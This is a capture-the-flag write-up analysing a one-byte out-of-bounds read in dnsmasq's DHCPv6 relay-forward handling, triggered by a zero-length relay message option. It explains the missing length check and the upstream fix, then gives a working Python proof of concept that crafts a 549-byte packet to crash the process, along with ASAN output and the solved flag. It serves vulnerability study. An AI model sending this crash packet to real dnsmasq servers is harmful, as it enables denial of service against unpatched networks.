---
title: "VULN#002"
category: "Vuln Research"
tags: ["dnsmasq", "dhcpv6", "relay-forward", "out-of-bounds-read", "asan", "crash-oracle"]
solve_date: "2026-10-26T09:54:25+07:00"
language: "en"
points: 112
---

# VULN#002 — dnsmasq DHCPv6 relay: zero-length relay message OOB read

**Flag:** `CTF{67f6cb9066aec0b416ebcd43b6eed73c}`
**Service:** `169.58.126.107:7026`
**Flag format:** `CTF{}`

## Challenge

> VULN#002 — Acme Gateway's DHCPv6 relay is built on a real, unmodified, open-source DHCP/DNS forwarder, at a real revision.

The handout is the exact `dnsmasq` source tree the target is built from. The service accepts a 4-byte big-endian length followed by a raw packet, feeds it to the dnsmasq DHCPv6 path, and reports whether the process crashed. A crash that matches the challenge's target bug returns the flag.

## Analysis

### Identifying the revision

The archive matches upstream dnsmasq commit `c8168e8` exactly. That commit is the direct parent of `0597828` — *"Tighten length checking to avoid possible buffer read-overrun in DHCPv6"*. The bug is therefore a known one-line class of fix, and the handout is deliberately the vulnerable parent.

### The bug

In `src/rfc3315.c`, `dhcp6_maybe_relay()` starts with:

```c
static int dhcp6_maybe_relay(struct state *state,
                             void *inbuff, size_t sz,
                             struct in6_addr *client_addr,
                             int is_unicast, time_t now)
{
  void *p = inbuff;
  ...
  unsigned int msg_type = *((unsigned char *)p);
```

It dereferences the first byte before checking that the packet is at least four bytes — the DHCPv6 message header is four bytes (type + 3-byte transaction ID). A `RELAY-FORW` (type 12) carrying an `OPTION6_RELAY_MSG` (code 9) of length zero reaches the recursive call at line 255 with `sz = 0`:

```c
if (dhcp6_maybe_relay(state, p + 4, opt_len, client_addr, 0, now))
```

The recursive call then reads `*inbuff` from a zero-length buffer — a one-byte out-of-bounds read just past the receive allocation. The upstream fix is:

```c
if (sz < 4)
  return 0;
```

before the dereference.

### Why the packet size matters

`recv_dhcp_packet()` uses an initial 548-byte packet buffer and reallocates to exactly the received size when the datagram is larger. Sending a packet of exactly **549 bytes** makes the receive allocation 549 bytes, so the one-byte read at the zero-length relay message lands precisely at the end of the heap allocation and is caught by the allocator/ASAN.

Working packet layout:

| Field | Bytes | Value |
|---|---:|---|
| Message type / hop count | 2 | `12 00` (RELAY-FORW, hop 0) |
| Link address | 16 | `fd00::1` |
| Peer address | 16 | `fd00::1` |
| Filler option | 511 | option code 50, length 507, 507 filler bytes |
| Relay message option | 4 | option code 9, length 0 |
| **Total** | **549** | |

## PoC

```python
import socket

HOST, PORT = "169.58.126.107", 7026
link = socket.inet_pton(socket.AF_INET6, "fd00::1")
peer = socket.inet_pton(socket.AF_INET6, "fd00::1")

pkt  = bytes([12, 0]) + link + peer
pkt += (50).to_bytes(2, "big") + (507).to_bytes(2, "big") + b"A" * 507
pkt += (9).to_bytes(2, "big") + (0).to_bytes(2, "big")
assert len(pkt) == 549

s = socket.create_connection((HOST, PORT), timeout=10)
s.sendall(len(pkt).to_bytes(4, "big") + pkt)
print(s.recv(4096).decode(errors="replace"))
```

Local verification against an ASAN build of the provided tree:

```text
==ERROR: AddressSanitizer: heap-buffer-overflow on address ...
READ of size 1
    #0 dhcp6_maybe_relay src/rfc3315.c:115
    #1 dhcp6_maybe_relay src/rfc3315.c:255
    #2 dhcp6_reply src/rfc3315.c:...
```

The remote harness confirms the target signature:

```text
status: confirmed
FLAG: CTF{67f6cb9066aec0b416ebcd43b6eed73c}
```

## Notes

- The packet needs no valid DHCPv6 context: no link-address prefix match, no client ID, no relay message content. The bug is in the frame-length validation, before any semantic processing.
- A relay-forward with a harmless non-empty option but no relay message can also produce a reply without context; the zero-length relay message is what triggers the OOB read.
- The target is a crash oracle. Earlier probe packets that returned `status: no crash` (fixed 3.5s timeout) were structurally valid but never reached the vulnerable dereference; the 549-byte boundary packet returned in about 1.1s because the process died early.
- The same fix also covers other short-message cases, but the zero-length `OPTION6_RELAY_MSG` is the minimal, context-free trigger.

## References

- dnsmasq upstream commit `0597828` — "Tighten length checking to avoid possible buffer read-overrun in DHCPv6"
- dnsmasq git: <https://thekelleys.org.uk/git/dnsmasq.git>
- CERT VU#471747 — dnsmasq vulnerabilities: <https://kb.cert.org/vuls/id/471747>
